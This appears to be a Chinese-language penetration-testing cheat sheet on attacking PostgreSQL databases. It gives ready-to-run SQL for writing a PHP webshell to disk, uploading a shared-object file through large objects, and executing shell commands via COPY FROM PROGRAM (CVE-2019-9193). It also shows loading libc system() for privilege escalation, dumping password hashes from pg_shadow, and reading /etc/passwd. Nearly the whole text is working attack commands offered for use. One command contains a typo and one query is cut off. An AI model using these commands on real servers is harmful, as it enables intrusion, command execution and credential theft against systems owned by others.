# PostgreSQL

更新时间：2021.9.28

老鸟速查笔记，新手建议直接读文末引用。





# GetShell

###  写shell

- 拥有网站路径写入权限
- 知道网站绝对路径

```
copy  (select '<?php phpinfo();?>') to '/tmp/1.php';
```

利用分片进行上传，首先创建一个 OID 作为写入的对象, 然后通过 0,1,2,3… 分片上传但是对象都为 12345 最后导出到 / tmp 目录下, 收尾删除 OID
```
SELECT lo_create(12345);
INSERT INTO pg_largeobject VALUES (12345, 0, decode('7f454c4...0000', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 1, decode('0000000...0000', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 2, decode('f604000...0000', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 3, decode('0000000...7400', 'hex'));
SELECT lo_export(12345, '/tmp/test.so');
SELECT lo_unlink(12345);
```




# Vuln

### CVE-2018-1058 PostgreSQL 提权漏洞


PostgreSQL 其 9.3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。


### PostgreSQL 提权漏洞（CVE-2018-1058）
CVE-2019-9193 PostgreSQL 高权限命令执行漏洞

PostgreSQL 其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```



# Privilege Escalation


调用本地so文件,或者自己上传so命令执行

- 一般8.2以下的版本可以

```
CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;
CREATE FUNCTION system(cstring) RcETURNS int AS '/lib64/libc.so.6', 'system' LANGUAGE C STRICT;
select system('id');
```

https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql


# Other


查询密码
```
SELECT usename, passwd FROM pg_shadow;
```
PostgreSQL 读取文件
```
select pg_read_file('/etc/passwd');
drop table testaaaa;
create table testaaaa(t TEXT);
copy testaaaa from '/etc/passwd';
select * from testaaaa limit 1 offset 0;
```
PostgreSQL 读取文件2
```
Select lo_import('/etc/passwd',12345678);
select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno
```





# References
